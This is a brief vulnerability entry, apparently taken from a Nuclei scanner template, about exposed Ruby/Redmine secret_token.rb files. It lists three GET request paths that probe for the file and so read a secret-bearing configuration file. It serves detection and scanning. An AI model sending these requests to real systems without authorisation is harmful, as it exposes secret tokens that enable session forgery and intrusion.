# Vulnerability: Secret Token Ruby - File Disclosure
**Classification:** REDMINE
**Source:** Nuclei Template (`secret-token-rb.yaml`)

## Description
Ruby Secret token is exposed.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/secret_token.rb
GET {{BaseURL}}/config/initializers/secret_token.rb
GET {{BaseURL}}/redmine/config/initializers/secret_token.rb
```

